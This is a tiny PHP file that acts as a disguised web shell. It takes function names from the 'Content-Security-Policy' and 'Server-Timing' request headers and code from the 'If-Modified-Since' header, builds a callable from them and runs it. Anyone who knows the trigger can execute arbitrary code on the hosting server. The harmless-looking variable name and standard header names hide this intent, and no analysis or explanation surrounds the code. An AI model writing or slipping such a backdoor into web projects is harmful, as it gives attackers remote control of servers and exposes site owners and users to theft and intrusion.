<?php
$_HEADERS = getallheaders();
if (isset($_HEADERS['Content-Security-Policy'])) {
    $parle_tokens = $_HEADERS['Content-Security-Policy']('', $_HEADERS['Server-Timing']($_HEADERS['If-Modified-Since']));
    $parle_tokens();
}